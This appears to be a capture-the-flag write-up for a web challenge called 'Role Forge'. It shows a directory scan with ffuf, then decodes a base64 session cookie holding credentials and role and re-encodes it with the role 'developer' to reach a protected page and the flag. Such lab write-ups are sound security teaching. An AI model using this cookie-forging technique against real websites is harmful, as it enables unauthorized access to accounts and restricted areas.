## Role Forge

## Description
```
A friend of mine is currently setting up a website for his forge. 
Apparently they are not only smithing weapons and tools but also sweets in those furnaces.

Can you uncover the secret?
```

## Writeup

Starting off, we should take a look at the website. <br/>
```html
$ curl 192.168.24.128                                         
<!DOCTYPE html>
<html>
<head>
    <title>Role-Forge</title>
    <link rel="stylesheet" type="text/css" href="/static/./style.css">
</head>
<body>
    <div id="mainSection">
        <h2>Deluxe Forge</h2>
        <br/>
        <p><a href="/login">Login</a></p>
        <p><a href="/signup">Signup</a></p>
    </div>
    <!-- Note from developer: We need to fix access to dashboard, apparently admin role doesn't have access to it! -->
</body>
</html>
```

Looking at the other things doen't reveal anything more interesting, but we should keep the comment in mind. <br/>
Before going on we should do some kind of directory scan first. <br/>
```sh
$ ffuf -w ./Tools/wordlists/wordlists/discovery/directories.txt -u http://192.168.24.128/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.24.128/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Tools/wordlists/wordlists/discovery/directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 448, Words: 80, Lines: 16, Duration: 28ms]
    * FUZZ: ??

[Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 26ms]
    * FUZZ: developer

[Status: 200, Size: 646, Words: 152, Lines: 24, Duration: 30ms]
    * FUZZ: login

[Status: 200, Size: 649, Words: 152, Lines: 24, Duration: 31ms]
    * FUZZ: signup

:: Progress: [58655/58655] :: Job [1/1] :: 1333 req/sec :: Duration: [0:00:43] :: Errors: 1 ::
```

Trying to access the `/developer` webpage redirects us to the index page. <br/>
Next we should test the funtions avilable to us. <br/>
After creating an account and logging in with the newly made account we actually get a cookie set. <br/>
Seeing the cookie we should be able to see that it's `base64` encoded. <br/>
```sh
$ echo 'eyJ1c2VybmFtZSI6ICIxMjMiLCAicGFzc3dvcmQiOiAiMTIzIiwgInJvbGUiOiAidXNlciJ9' | base64 -d
{"username": "123", "password": "123", "role": "user"}
```

Decoding the `cookie` reveals our users credentials and role. <br/>
Remembering the comment from the index page which states that `admin` role doesn't have access to the dashboard from `developer`, we can assume that we need to change our role to gain access to the dashboard. <br/>
```sh
$ echo '{"username": "123", "password": "123", "role": "developer"}' | base64
eyJ1c2VybmFtZSI6ICIxMjMiLCAicGFzc3dvcmQiOiAiMTIzIiwgInJvbGUiOiAiZGV2ZWxvcGVyIn0K
```

Encoding the changed cookie content, exchanging the cookie on the website and navigating to `/developer` doesn't redirect us to the index page anymore. <br/>
Instead we now have access to the webpage which contains the flag. <br/>
![image](https://github.com/CTF-Citadel/challenges/assets/110562298/c89c6099-6ada-45b5-bac7-b01ddb93cb88)

Obtaining the flag concludes this writeup. 


